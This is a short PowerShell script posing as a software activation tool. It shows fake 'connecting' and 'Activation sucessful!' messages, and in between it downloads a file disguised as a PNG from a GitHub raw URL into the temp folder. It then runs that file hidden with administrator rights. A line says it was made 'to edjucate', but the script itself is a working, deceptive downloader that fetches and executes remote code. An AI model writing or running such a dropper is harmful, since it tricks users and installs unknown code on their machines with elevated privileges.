$Congrats = "I created this to edjucate." "Connecting to service, please wait..." $downloadUrl = "https://raw.githubusercontent.com/rtx64/messingaround/refs/heads/main/testrequest.png" $tempPath = "$env:TEMP\testrequest.png" $tempPath "%APPDATA%" Start-Sleep -Seconds 5 Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb RunAs $bruh = Read-Host "Please enter the software, you want to activate" Start-Sleep -Seconds 5 "Activation sucessful!"
